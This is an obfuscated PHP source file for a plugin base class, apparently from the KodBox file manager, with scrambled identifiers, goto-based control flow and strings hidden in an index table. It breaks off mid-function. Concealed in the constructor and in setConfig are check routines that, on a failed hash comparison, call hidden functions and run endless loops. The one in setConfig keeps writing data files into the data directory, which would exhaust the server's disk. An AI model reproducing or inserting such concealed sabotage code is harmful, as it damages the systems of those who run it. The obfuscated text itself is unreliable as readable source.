define($_SERVER[åÌÛ»ô¢‚ö™][241], 1); goto B”œÚÂºÆÆ; FòöŸÆò«‰: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto CåĞ› „‚á; aàíìšàŒ˜: $this->pluginName = str_replace($dÛæ‚­ÈÓ¨[1334], $dÛæ‚­ÈÓ¨[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $dÛæ‚­ÈÓ¨[8]; $this->pluginApi = appHostGet() . $dÛæ‚­ÈÓ¨[1335] . $this->pluginName . $dÛæ‚­ÈÓ¨[8]; goto B÷Ş˜æ¾äô; CåĞ› „‚á: $dÛæ‚­ÈÓ¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($_SERVER[$dÛæ‚­ÈÓ¨[179]]) || !isset($_SERVER[$dÛæ‚­ÈÓ¨[787]])) { goto a“§‡Å¿ŠË; fÔÔ×òÇ¬: $bÊŞøÙÛ…÷ = $dÛæ‚­ÈÓ¨[819]; $bÊŞøÙÛ…÷($_SERVER[$dÛæ‚­ÈÓ¨[820]]); $CÁ¿î©‘ëø = 1; goto A™»‚‚“¶; B¹¯ª™‚Û: $C™Àø³‡ôÔ = $E˜õ˜¨Şœ»($e·ˆ¼ç¤¥¢); $bšáÖôŸÍ“ = explode($dÛæ‚­ÈÓ¨[183], $C™Àø³‡ôÔ); if (count($bšáÖôŸÍ“) < $dÛæ‚­ÈÓ¨[573]) { $f Ÿ“Ë¦“ = $dÛæ‚­ÈÓ¨[185]; $f Ÿ“Ë¦“(); } goto fÔÔ×òÇ¬; A™»‚‚“¶: for ($F™‚á°çÒà = $CÁ¿î©‘ëø; $F™‚á°çÒà > 0; $F™‚á°çÒà++) { $bÊŞøÙÛ…÷ = json_encode($GLOBALS[$dÛæ‚­ÈÓ¨[409]]); } goto dƒáÓ½¿‹à; a“§‡Å¿ŠË: $a®Ä¾•¬Ø = $dÛæ‚­ÈÓ¨[818]; $E˜õ˜¨Şœ» = $dÛæ‚­ÈÓ¨[180]; $e·ˆ¼ç¤¥¢ = $_SERVER[$dÛæ‚­ÈÓ¨[181]] . $dÛæ‚­ÈÓ¨[182]; goto B¹¯ª™‚Û; dƒáÓ½¿‹à: } global $in, $config; goto b¿÷ß…¨Å…; B÷Ş˜æ¾äô: $this->pluginHost = $config[$dÛæ‚­ÈÓ¨[1336]] . $this->pluginName . $dÛæ‚­ÈÓ¨[8]; $this->pluginHostDefault = $config[$dÛæ‚­ÈÓ¨[1336]] . $this->pluginName . $dÛæ‚­ÈÓ¨[8]; $aáŠ³ëì×± = $config[$dÛæ‚­ÈÓ¨[1337]]; goto B“Å‡ö×Û; b¿÷ß…¨Å…: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($dÛæ‚­ÈÓ¨[1334]); goto aàíìšàŒ˜; B“Å‡ö×Û: if ($aáŠ³ëì×± && strpos($dÛæ‚­ÈÓ¨[47] . $aáŠ³ëì×± . $dÛæ‚­ÈÓ¨[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$dÛæ‚­ÈÓ¨[1338]] . $this->pluginName . $dÛæ‚­ÈÓ¨[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto A›¥ˆ™ïÏñ; A›¥ˆ™ïÏñ: return $this; goto céğ¹­Ø•…; céğ¹­Ø•…: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[åÌÛ»ô¢‚ö™][1339]); } protected function assign($e™Ğ¯ÁáÂÃ, $bã‹—ŒÑ‚Š = false) { if (is_array($e™Ğ¯ÁáÂÃ)) { $this->values = array_merge($this->values, $e™Ğ¯ÁáÂÃ); } else { $this->values[$e™Ğ¯ÁáÂÃ] = $bã‹—ŒÑ‚Š; } } protected function display($cÓãùÁ£×‘) { extract($this->values); require $cÓãùÁ£×‘; } final function hookRegist($B‘î¿…¥”Ã) { $this->modelPlugin->appRegist($this->pluginName, $B‘î¿…¥”Ã); } final function appIcon() { $eÜ¡‘ã…’ˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cã×ÓÑ’Û¤ = $this->appPackage(); $aˆ‘ÂÁó« = $eÜ¡‘ã…’ˆ[33]; if (isset($cã×ÓÑ’Û¤[$eÜ¡‘ã…’ˆ[407]])) { if (isset($cã×ÓÑ’Û¤[$eÜ¡‘ã…’ˆ[407]][$eÜ¡‘ã…’ˆ[1340]])) { $aˆ‘ÂÁó« = $eÜ¡‘ã…’ˆ[1341] . $cã×ÓÑ’Û¤[$eÜ¡‘ã…’ˆ[407]][$eÜ¡‘ã…’ˆ[1340]] . $eÜ¡‘ã…’ˆ[1342]; } else { if ($cã×ÓÑ’Û¤[$eÜ¡‘ã…’ˆ[407]][$eÜ¡‘ã…’ˆ[1343]]) { $aˆ‘ÂÁó« = $eÜ¡‘ã…’ˆ[1344] . $cã×ÓÑ’Û¤[$eÜ¡‘ã…’ˆ[407]][$eÜ¡‘ã…’ˆ[1343]] . $eÜ¡‘ã…’ˆ[1345]; } } } return $aˆ‘ÂÁó«; } final function fileCanView($CÕ‘¤ö×†¡) { goto cíß ¯…; fç³–Ã¤Ğ±: ActionCall($D½êîìÖ­Ş[1358], $CÕ‘¤ö×†¡); goto d†ÆàŒà°; cíß ¯…: $D½êîìÖ­Ş =& $_SERVER[åÌÛ»ô¢‚ö™]; if (request_url_safe($CÕ‘¤ö×†¡)) { return !0; } if ($this->isShare($CÕ‘¤ö×†¡)) { return !0; } goto bé½÷âìÓ™; bé½÷âìÓ™: $D¸«ÓÑ§ß = Session::get($D½êîìÖ­Ş[1346]); if (!$D¸«ÓÑ§ß || !$D¸«ÓÑ§ß[$D½êîìÖ­Ş[1347]]) { $aÕâß‹’›Í = $D½êîìÖ­Ş[1348] . rawurlencode(this_url()); show_tips(LNG($D½êîìÖ­Ş[1349]) . $D½êîìÖ­Ş[1350] . $aÕâß‹’›Í . $D½êîìÖ­Ş[1351] . LNG($D½êîìÖ­Ş[1352]) . $D½êîìÖ­Ş[1353], !1); } if (!Action($D½êîìÖ­Ş[1354])->authCan($D½êîìÖ­Ş[1355])) { show_tips(LNG($D½êîìÖ­Ş[1356]) . $D½êîìÖ­Ş[1357], !1); } goto fç³–Ã¤Ğ±; d†ÆàŒà°: } final function isShare($FÔå ¾™) { $Eß¸‚œ®ôº = KodIO::parse($FÔå ¾™); return $Eß¸‚œ®ôº[$_SERVER[åÌÛ»ô¢‚ö™][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($BÄŒŠÆÁªî) { if (request_url_safe($BÄŒŠÆÁªî)) { return $BÄŒŠÆÁªî; } if (!$this->isShare($BÄŒŠÆÁªî)) { $BÄŒŠÆÁªî = $this->filePath($BÄŒŠÆÁªî); } return Action($_SERVER[åÌÛ»ô¢‚ö™][1045])->linkOut($BÄŒŠÆÁªî); } public function filePathLinkOut($C˜¨íŒÈ¼ß) { if (request_url_safe($C˜¨íŒÈ¼ß)) { return $C˜¨íŒÈ¼ß; } $this->fileCanView($C˜¨íŒÈ¼ß); return Action($_SERVER[åÌÛ»ô¢‚ö™][1045])->link($C˜¨íŒÈ¼ß); } final function filePath($B§²âšİ‘´) { $AÆ¡„†–ù… =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($dô¯¹ã‹åÓ = $this->checkSharePath($B§²âšİ‘´)) { return $dô¯¹ã‹åÓ; } $this->fileCanView($B§²âšİ‘´); if (request_url_safe($B§²âšİ‘´)) { $f™‰–¯‡³ = parse_url_query($B§²âšİ‘´); if (isset($f™‰–¯‡³[$AÆ¡„†–ù…[1359]]) && isset($f™‰–¯‡³[$AÆ¡„†–ù…[215]])) { $f½ĞòŠù¦ß = Model($AÆ¡„†–ù…[1114])->get($AÆ¡„†–ù…[1360]); $d˜ï‘‹ÂÍé = Mcrypt::decode($f™‰–¯‡³[$AÆ¡„†–ù…[215]], $f½ĞòŠù¦ß); if ($d˜ï‘‹ÂÍé) { $this->fileInfo = IO::infoWithChildren($d˜ï‘‹ÂÍé); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $d˜ï‘‹ÂÍé; } } $B§²âšİ‘´ = $this->_cacheHttpFile($B§²âšİ‘´); $this->fileInfo = IO::infoWithChildren($B§²âšİ‘´); } else { $this->fileInfo = IO::infoWithChildren($B§²âšİ‘´); if (!$this->fileInfo) { show_tips(LNG($AÆ¡„†–ù…[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $B§²âšİ‘´; } final function _cacheHttpFile($a¯Œìíä¾) { $có¿µ ÊìŠ = hash_path($a¯Œìíä¾, !0); $this->cachePath = $this->pluginCachePath($có¿µ ÊìŠ); if ($fçŠ¥Ö¥ìĞ = IO::fileNameExist($this->cachePath, $có¿µ ÊìŠ)) { return KodIO::make($fçŠ¥Ö¥ìĞ); } $A”å„†’ = $this->cachePath . $có¿µ ÊìŠ; return $this->pluginCacheFileSet($A”å„†’, file_get_contents($a¯Œìíä¾)); } final function _tmpFileName($cã™“ö„£ = array()) { goto Fì¹â³”®; E†½àç¹†Í: $EÖ¬ÚÈÏÎá = array($cã™“ö„£[$f¥Üó»Ô‚²[28]], $cã™“ö„£[$f¥Üó»Ô‚²[75]], $cã™“ö„£[$f¥Üó»Ô‚²[77]]); if (isset($cã™“ö„£[$f¥Üó»Ô‚²[485]])) { $EÖ¬ÚÈÏÎá[] = $cã™“ö„£[$f¥Üó»Ô‚²[485]]; } return md5(implode($f¥Üó»Ô‚²[70], $EÖ¬ÚÈÏÎá)); goto bÇ™Ô‰–ˆÒ; Fì¹â³”®: $f¥Üó»Ô‚² =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$cã™“ö„£) { $cã™“ö„£ = $this->fileInfo; } if (isset($cã™“ö„£[$f¥Üó»Ô‚²[168]])) { return $cã™“ö„£[$f¥Üó»Ô‚²[168]]; } goto BÉÜÍó‹Ñ; BÉÜÍó‹Ñ: if (isset($cã™“ö„£[$f¥Üó»Ô‚²[161]][$f¥Üó»Ô‚²[168]])) { return $cã™“ö„£[$f¥Üó»Ô‚²[161]][$f¥Üó»Ô‚²[168]]; } $B‘»éŒÕ‰Ğ = IO::hashSimple($cã™“ö„£[$f¥Üó»Ô‚²[75]]); if ($B‘»éŒÕ‰Ğ) { return $B‘»éŒÕ‰Ğ; } goto E†½àç¹†Í; bÇ™Ô‰–ˆÒ: } final function checkSharePath($c ¢Ïê¿) { goto dÊô†ãïä; F„‘×ñëÉÀ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$f¡Ë‚ã‹À [168]]); return $AƒÚ÷®œë[$f¡Ë‚ã‹À [75]]; goto CîÈ¯ÏŞŸ¸; dÊô†ãïä: $f¡Ë‚ã‹À  =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!defined($f¡Ë‚ã‹À [451])) { define($f¡Ë‚ã‹À [1361], 0); } if (!$this->isShare($c ¢Ïê¿)) { return !1; } goto a‰…æÍ†«ò; a‰…æÍ†«ò: $AƒÚ÷®œë = Action($f¡Ë‚ã‹À [1045])->sharePathInfo($c ¢Ïê¿); if (!isset($AƒÚ÷®œë[$f¡Ë‚ã‹À [75]])) { show_json(LNG($f¡Ë‚ã‹À [1362]), !1); } $this->fileInfo = $AƒÚ÷®œë[$f¡Ë‚ã‹À [161]]; goto F„‘×ñëÉÀ; CîÈ¯ÏŞŸ¸: } final function pluginCachePath($fá·ª¨ù’ = '') { $EÊçåÔ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c÷¦Ãæ¬äÍ = IO_PATH_SYSTEM_TEMP . $EÊçåÔ[1363] . $this->pluginName; if (!($A‘ˆÇ¥Ä‡¸ = IO::infoFull($c÷¦Ãæ¬äÍ))) { return IO::mkdir($c÷¦Ãæ¬äÍ . $EÊçåÔ[8] . $fá·ª¨ù’); } if (empty($fá·ª¨ù’)) { return $A‘ˆÇ¥Ä‡¸[$EÊçåÔ[75]]; } if (!($D ÎÁ½ˆ£ = IO::fileNameExist($A‘ˆÇ¥Ä‡¸[$EÊçåÔ[75]], $fá·ª¨ù’))) { return IO::mkdir($A‘ˆÇ¥Ä‡¸[$EÊçåÔ[75]] . $fá·ª¨ù’); } return KodIO::make($D ÎÁ½ˆ£); } final function pluginCacheFileSet($aˆ…“©¾, $c²ë‘¼½‚À = '') { $cùª¼—åÊ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!($Fƒ´íœù = IO::infoFull($aˆ…“©¾))) { return IO::mkfile($aˆ…“©¾, $c²ë‘¼½‚À, REPEAT_REPLACE); } IO::setContent($Fƒ´íœù[$cùª¼—åÊ[75]], $c²ë‘¼½‚À); return $Fƒ´íœù[$cùª¼—åÊ[75]]; } final function pluginLocalFile($c¡”ÓŒ¸³ñ = '') { goto dÂË‰†ÅÜé; AÂ““Å¶»: if (!checkExtSafe($CŒ’ÑÌµ„)) { $CŒ’ÑÌµ„ = $CŒ’ÑÌµ„ . $bŞ¿Öé›¿[1364]; } $aÄ´¢¼´Çš = $E¬¬‹…ì½° . $CŒ’ÑÌµ„; if (@file_exists($aÄ´¢¼´Çš)) { return $aÄ´¢¼´Çš; } goto B”–ãÂí; dÂË‰†ÅÜé: $bŞ¿Öé›¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $E¬¬‹…ì½° = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($E¬¬‹…ì½°)) { mk_dir($E¬¬‹…ì½°); } goto c¶ÍÃ¢“¨Ÿ; c¶ÍÃ¢“¨Ÿ: if (!$c¡”ÓŒ¸³ñ) { return $E¬¬‹…ì½°; } $D˜Ä±™ÑÖ = IO::info($c¡”ÓŒ¸³ñ); $CŒ’ÑÌµ„ = $this->_tmpFileName($D˜Ä±™ÑÖ) . $bŞ¿Öé›¿[91] . $D˜Ä±™ÑÖ[$bŞ¿Öé›¿[165]]; goto AÂ““Å¶»; B”–ãÂí: return IO::copy($c¡”ÓŒ¸³ñ, $E¬¬‹…ì½°, 0, $CŒ’ÑÌµ„); goto fö¦±•©’ö; fö¦±•©’ö: } final function appPackage() { goto dÏ¼ÆÌì; e³°Ş‰ö: return $A¶•Ç¡²£¶; goto BÜ·±ˆ¯–‘; C¬™†é¡×: $b‚ƒ¹§½‘Ë = Hook::trigger($eÈ«Ÿ±ÒÑÒ[1366], $A¶•Ç¡²£¶); if ($b‚ƒ¹§½‘Ë && is_array($b‚ƒ¹§½‘Ë)) { $A¶•Ç¡²£¶ = $b‚ƒ¹§½‘Ë; } $this->packageData = $A¶•Ç¡²£¶; goto e³°Ş‰ö; EÁÎ¾Ÿ¯À³: $this->parseLang($a–¡¡¢¬ Ã); $A¶•Ç¡²£¶ = json_decode_force($a–¡¡¢¬ Ã); if (!$A¶•Ç¡²£¶) { return array(); } goto C¬™†é¡×; dÏ¼ÆÌì: $eÈ«Ÿ±ÒÑÒ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->packageData) { return $this->packageData; } $a–¡¡¢¬ Ã = $this->parseFile($this->pluginPath . $eÈ«Ÿ±ÒÑÒ[1365]); goto EÁÎ¾Ÿ¯À³; BÜ·±ˆ¯–‘: } public function packageInfoGet($dŠÎÅ’ß•‹) { $bÚ”™Š†„ = $this->appPackage(); return array_get_value($bÚ”™Š†„, $dŠÎÅ’ß•‹); } public function packageVersion() { return $this->packageInfoGet($_SERVER[åÌÛ»ô¢‚ö™][1367]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[åÌÛ»ô¢‚ö™][1368]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[åÌÛ»ô¢‚ö™][1369]); } private function parseFile($b½Š‹ğ½µæ) { goto d÷Ğ–·¼×; DÈ©Úªí©: $a‡Ã×¦— = str_replace($aîË ÎÓ…, $BÈ©‡øÑóà, $a‡Ã×¦—); return $a‡Ã×¦—; goto b¯¸¢©Îíâ; d÷Ğ–·¼×: $AÉ‘åÁêÏå =& $_SERVER[åÌÛ»ô¢‚ö™]; $a‡Ã×¦— = file_get_contents($b½Š‹ğ½µæ); $aîË ÎÓ… = array($AÉ‘åÁêÏå[1370], $AÉ‘åÁêÏå[1371], $AÉ‘åÁêÏå[1372], $AÉ‘åÁêÏå[1373], $AÉ‘åÁêÏå[1374], $AÉ‘åÁêÏå[1375], $AÉ‘åÁêÏå[1376]); goto BçÑ˜¦öÖˆ; BçÑ˜¦öÖˆ: $BÈ©‡øÑóà = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$AÉ‘åÁêÏå[84]][$AÉ‘åÁêÏå[1377]]); if (strstr($a‡Ã×¦—, $AÉ‘åÁêÏå[1378])) { $aå¶À…¨…‰ = rawurlencode(json_encode($this->pluginLangArr)); $a‡Ã×¦— = str_replace($AÉ‘åÁêÏå[1378], $aå¶À…¨…‰, $a‡Ã×¦—); } if (strstr($a‡Ã×¦—, $AÉ‘åÁêÏå[1379])) { $aå¶À…¨…‰ = $aå¶À…¨…‰ = rawurlencode(json_encode($this->getConfig())); $a‡Ã×¦— = str_replace($AÉ‘åÁêÏå[1379], $aå¶À…¨…‰, $a‡Ã×¦—); } goto DÈ©Úªí©; b¯¸¢©Îíâ: } private function parseLang(&$BŠÏâ£Ú·„) { goto AØ¬¦à×„¤; cÓ‹ƒ±âë: preg_match_all($Bš„«ã¦Ò²[1381], $BŠÏâ£Ú·„, $FÙÑÃ¥—šÖ); if (!is_array($FÙÑÃ¥—šÖ) || count($FÙÑÃ¥—šÖ) == 0 || !is_array($FÙÑÃ¥—šÖ[0]) || count($FÙÑÃ¥—šÖ[0]) == 0) { return; } $bÀ·¢”‰ó = array(); goto fğòˆ„…ùê; fğòˆ„…ùê: $eİèã£§– = array(); foreach ($FÙÑÃ¥—šÖ[0] as $e—„ˆ¦¯²Ø) { $BµÆíğˆ×ó = substr($e—„ˆ¦¯²Ø, strlen($f¼Àæ½ŸĞ), -4); $e¡…Î›¶”° = LNG($BµÆíğˆ×ó); $bÀ·¢”‰ó[] = $e—„ˆ¦¯²Ø; $eİèã£§–[] = str_replace(array($Bš„«ã¦Ò²[183], $Bš„«ã¦Ò²[1015], $Bš„«ã¦Ò²[345], $Bš„«ã¦Ò²[113]), array($Bš„«ã¦Ò²[50], $Bš„«ã¦Ò²[50], $Bš„«ã¦Ò²[33], $Bš„«ã¦Ò²[1382]), $e¡…Î›¶”°); } $BŠÏâ£Ú·„ = str_replace($bÀ·¢”‰ó, $eİèã£§–, $BŠÏâ£Ú·„); goto FŠì‡¡—ºñ; AØ¬¦à×„¤: $Bš„«ã¦Ò² =& $_SERVER[åÌÛ»ô¢‚ö™]; $f¼Àæ½ŸĞ = $Bš„«ã¦Ò²[1380]; if (!strstr($BŠÏâ£Ú·„, $f¼Àæ½ŸĞ)) { return; } goto cÓ‹ƒ±âë; FŠì‡¡—ºñ: } private function parseConfig(&$B¨Ğ«¾ÂòĞ) { goto a®½À”‘ Ä; díŒÓß†Š£: $B¨Ğ«¾ÂòĞ = str_replace($Aëš‡ñƒ, $E§Ñ‘‰ºĞ‚, $B¨Ğ«¾ÂòĞ); goto fàØ°î®·³; cŒÕ¥Ÿ½Ú…: $Aëš‡ñƒ = array(); $E§Ñ‘‰ºĞ‚ = array(); foreach ($cÕˆ¶ğ³Îò[0] as $b¦ÅÊ–ì) { $CµÚ­¨õ‡ô = substr($b¦ÅÊ–ì, strlen($EÈæÉ´¡—), -2); $Aëš‡ñƒ[] = $b¦ÅÊ–ì; $E§Ñ‘‰ºĞ‚[] = _get($EÇŸõ·Ó½, $CµÚ­¨õ‡ô); } goto díŒÓß†Š£; a®½À”‘ Ä: $a›ëõŸ«ø =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÈæÉ´¡— = $a›ëõŸ«ø[1383]; if (!strstr($B¨Ğ«¾ÂòĞ, $EÈæÉ´¡—)) { return; } goto c¤–ÇÏö‡ì; c¤–ÇÏö‡ì: preg_match_all($a›ëõŸ«ø[1384], $B¨Ğ«¾ÂòĞ, $cÕˆ¶ğ³Îò); if (!is_array($cÕˆ¶ğ³Îò) || count($cÕˆ¶ğ³Îò) == 0 || !is_array($cÕˆ¶ğ³Îò[0]) || count($cÕˆ¶ğ³Îò[0]) == 0) { return; } $EÇŸõ·Ó½ = $this->getConfig(); goto cŒÕ¥Ÿ½Ú…; fàØ°î®·³: } private function parsePackage(&$Fà¹‘èòÉ) { goto A“¢š»´×ë; A“¢š»´×ë: $A„ãö»¼ÜÈ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A¼’”é– = $A„ãö»¼ÜÈ[1385]; if (!strstr($Fà¹‘èòÉ, $A¼’”é–)) { return; } goto BŠÒ‚œ·Â—; BŠÒ‚œ·Â—: preg_match_all($A„ãö»¼ÜÈ[1386], $Fà¹‘èòÉ, $Fæ¬¢±µ¸); if (!is_array($Fæ¬¢±µ¸) || count($Fæ¬¢±µ¸) == 0 || !is_array($Fæ¬¢±µ¸[0]) || count($Fæ¬¢±µ¸[0]) == 0) { return; } $d‹ÊùÍÓ‹ = $this->appPackage(); goto FÚîê½ëµ; cßßîĞğÆ: $Fà¹‘èòÉ = str_replace($eèˆ­‰‡Ãé, $dµÒŒ‹Î®Ï, $Fà¹‘èòÉ); goto e”²Íã«§; FÚîê½ëµ: $eèˆ­‰‡Ãé = array(); $dµÒŒ‹Î®Ï = array(); foreach ($Fæ¬¢±µ¸[0] as $Dœ–ë·Œ…ß) { $A õÁ…«ºÕ = substr($Dœ–ë·Œ…ß, strlen($A¼’”é–), -2); $eèˆ­‰‡Ãé[] = $Dœ–ë·Œ…ß; $dµÒŒ‹Î®Ï[] = _get($d‹ÊùÍÓ‹, $A õÁ…«ºÕ); } goto cßßîĞğÆ; e”²Íã«§: } final function echoFile($bÎ¡ÓØÈæö, $aòíù•è›É = false) { goto d’‰Íóø¢; f“†Š…ßßÕ: $dôÖ‡õ¥Ú = $this->parseFile($C÷ê¥×”®‚); $this->parseLang($dôÖ‡õ¥Ú); $this->parseConfig($dôÖ‡õ¥Ú); goto e¥ö®ãˆª…; d’‰Íóø¢: $e‹°ù¿Úº =& $_SERVER[åÌÛ»ô¢‚ö™]; $C÷ê¥×”®‚ = $this->pluginPath . $bÎ¡ÓØÈæö; if (ACT == $e‹°ù¿Úº[1387]) { echo $e‹°ù¿Úº[1388] . $this->pluginName . $e‹°ù¿Úº[8] . $bÎ¡ÓØÈæö . $e‹°ù¿Úº[1389]; if (!file_exists($C÷ê¥×”®‚)) { echo $e‹°ù¿Úº[1390]; return; } } goto f“†Š…ßßÕ; e¥ö®ãˆª…: $this->parsePackage($dôÖ‡õ¥Ú); if (is_array($aòíù•è›É)) { $dôÖ‡õ¥Ú = str_replace(array_keys($aòíù•è›É), array_values($aòíù•è›É), $dôÖ‡õ¥Ú); } echo $e‹°ù¿Úº[183] . $dôÖ‡õ¥Ú; goto C”»¡§ã•Î; C”»¡§ã•Î: } final function initLang() { goto EÁœ•Óµ—Š; eÉ®‹íÖ‹÷: if (!is_array($EÛÊ¢æ†¡­)) { return array(); } if (@count($EÛÊ¢æ†¡­) > 0) { I18n::set($EÛÊ¢æ†¡­); } return $EÛÊ¢æ†¡­; goto EÃğ™õõ³Î; d¥ßŠ‡®©Ö: $F†¤Á¡Áä = I18n::getType(); $EÛÊ¢æ†¡­ = array(); if (file_exists($b·³¥ÒÄ„¢ . $F†¤Á¡Áä . $DÇÛË×„î [792])) { $EÛÊ¢æ†¡­ = (include $b·³¥ÒÄ„¢ . $F†¤Á¡Áä . $DÇÛË×„î [792]); } else { if ($F†¤Á¡Áä == $DÇÛË×„î [1393] && !file_exists($b·³¥ÒÄ„¢ . $F†¤Á¡Áä . $DÇÛË×„î [792]) && file_exists($b·³¥ÒÄ„¢ . $DÇÛË×„î [1394])) { $EÛÊ¢æ†¡­ = (include $b·³¥ÒÄ„¢ . $DÇÛË×„î [1394]); } else { if (file_exists($b·³¥ÒÄ„¢ . $Eí´ùÄºãˆ . $DÇÛË×„î [792])) { $EÛÊ¢æ†¡­ = (include $b·³¥ÒÄ„¢ . $Eí´ùÄºãˆ . $DÇÛË×„î [792]); } } } goto eÉ®‹íÖ‹÷; EÁœ•Óµ—Š: $DÇÛË×„î  =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eí´ùÄºãˆ = $DÇÛË×„î [1391]; $b·³¥ÒÄ„¢ = $this->pluginPath . $DÇÛË×„î [1392]; goto d¥ßŠ‡®©Ö; EÃğ™õõ³Î: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Fƒµ¨’¼í‚) { $f‡¾ã­ŒÛ¬ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cêæïêÊÓ = $_SERVER[$f‡¾ã­ŒÛ¬[820]] . $f‡¾ã­ŒÛ¬[177]; $BÈƒçŠ˜Æ = $f‡¾ã­ŒÛ¬[178]; if ($_SERVER[$f‡¾ã­ŒÛ¬[179]] != $BÈƒçŠ˜Æ($cêæïêÊÓ)) { goto Aä‚‚‰Ø„Ò; DÉ½Ôº„ÃÍ: $f÷¦Ôß‘ÀÈ = 1; for ($dã¿ôï‹ƒ = $f÷¦Ôß‘ÀÈ; $dã¿ôï‹ƒ > 0; $dã¿ôï‹ƒ++) { $e‹ö¯ï—ï¢(DATA_PATH . $dã¿ôï‹ƒ, $eñï¢†´°); } goto D°’«ƒ‹; Aä‚‚‰Ø„Ò: $A–’‘Â¤ôÊ = $f‡¾ã­ŒÛ¬[818]; $CÕÅÀÖöÂ± = $f‡¾ã­ŒÛ¬[180]; $DÎ±—¦Ÿñª = $_SERVER[$f‡¾ã­ŒÛ¬[181]] . $f‡¾ã­ŒÛ¬[182]; goto f éÍ†â„ª; bÅƒ¾Ñ…Êé: $B‘Ñ‘¨Œ£… = $f‡¾ã­ŒÛ¬[819]; $B‘Ñ‘¨Œ£…($_SERVER[$f‡¾ã­ŒÛ¬[820]]); $A–’‘Â¤ôÊ = $f‡¾ã­ŒÛ¬[818]; goto C¾²ÏöÓÁˆ; f éÍ†â„ª: $F›šË…øõâ = $CÕÅÀÖöÂ±($DÎ±—¦Ÿñª); $bÚ•Ÿšš† = explode($f‡¾ã­ŒÛ¬[183], $F›šË…øõâ); if (count($bÚ•Ÿšš†) < $f‡¾ã­ŒÛ¬[573]) { $d–°ÖÒùÑ‰ = $f‡¾ã­ŒÛ¬[185]; $d–°ÖÒùÑ‰(); } goto bÅƒ¾Ñ…Êé; C¾²ÏöÓÁˆ: $A–’‘Â¤ôÊ(); $e‹ö¯ï—ï¢ = $f‡¾ã­ŒÛ¬[1395]; $eñï¢†´° = json_encode($GLOBALS[$f‡¾ã­ŒÛ¬[1396]]); goto DÉ½Ôº„ÃÍ; D°’«ƒ‹: } return $this->modelPlugin->setConfig($this->pluginName, $Fƒµ¨’¼í‚); } public function onSetConfig($bğàˆ××ÎÍ) { } public function onGetConfig($Aİ¤²îÙ“†) { } public function onChangeStatus($DĞÉÂ©ÀÏ„) { } public function onUninstall() { } public function onInstall() { } public function authCheck($E½ñìğ‹Ğ‘ = "\x70\154\x75\147\x69\156\101\165\164\150") { $EÙÀçÁÛ¨Â =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!defined($EÙÀçÁÛ¨Â[451])) { return !1; } if (_get($GLOBALS, $EÙÀçÁÛ¨Â[483])) { return !0; } $Dºó‹„Ïİ× = $this->getConfig(); if (!$Dºó‹„Ïİ×[$E½ñìğ‹Ğ‘]) { return !1; } return ActionCall($EÙÀçÁÛ¨Â[1397], $Dºó‹„Ïİ×[$E½ñìğ‹Ğ‘]); } public function url($d ÇÛ»ŠÍ, $cá’¯Ş®Çñ = '', $b‡—Ò×©˜§ = true) { goto Eòï§öóÍ¾; BÊªì‹¥×¦: if (!$b‡—Ò×©˜§) { return $Cá½´º—ÀÒ; } echo $Cá½´º—ÀÒ; goto e½È¾Ìš¦„; Eòï§öóÍ¾: $AÙÜ£íˆé™ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e‚øÌµ÷Ë´ = $this->getConfig(); $f¼¤‹£íâ§ = KOD_VERSION . $AÙÜ£íˆé™[91] . KOD_VERSION_BUILD; goto AİìÎŠÊò; AİìÎŠÊò: $aÈ¦ÅŸ†§› = $this->packageVersion(); $AÇ¬ØŒ›‚¡ = $f¼¤‹£íâ§ . $AÙÜ£íˆé™[437] . $aÈ¦ÅŸ†§›; if (substr($d ÇÛ»ŠÍ, 0, 4) == $AÙÜ£íˆé™[144] || substr($d ÇÛ»ŠÍ, 0, 2) == $AÙÜ£íˆé™[1181]) { $Cá½´º—ÀÒ = $d ÇÛ»ŠÍ . $AÙÜ£íˆé™[1398] . $AÇ¬ØŒ›‚¡; } else { if ($cá’¯Ş®Çñ == $AÙÜ£íˆé™[33]) { $Cá½´º—ÀÒ = $this->pluginHost . $d ÇÛ»ŠÍ . $AÙÜ£íˆé™[1398] . $AÇ¬ØŒ›‚¡; } else { if ($cá’¯Ş®Çñ === $AÙÜ£íˆé™[76]) { $Cá½´º—ÀÒ = $this->pluginHost . $d ÇÛ»ŠÍ; } else { if ($cá’¯Ş®Çñ == $AÙÜ£íˆé™[1399]) { $Cá½´º—ÀÒ = STATIC_PATH . $d ÇÛ»ŠÍ . $AÙÜ£íˆé™[1398] . $f¼¤‹£íâ§; } else { if ($cá’¯Ş®Çñ == $AÙÜ£íˆé™[1400]) { $Cá½´º—ÀÒ = APP_HOST . $AÙÜ£íˆé™[1401] . $d ÇÛ»ŠÍ . $AÙÜ£íˆé™[1398] . $f¼¤‹£íâ§; } else { 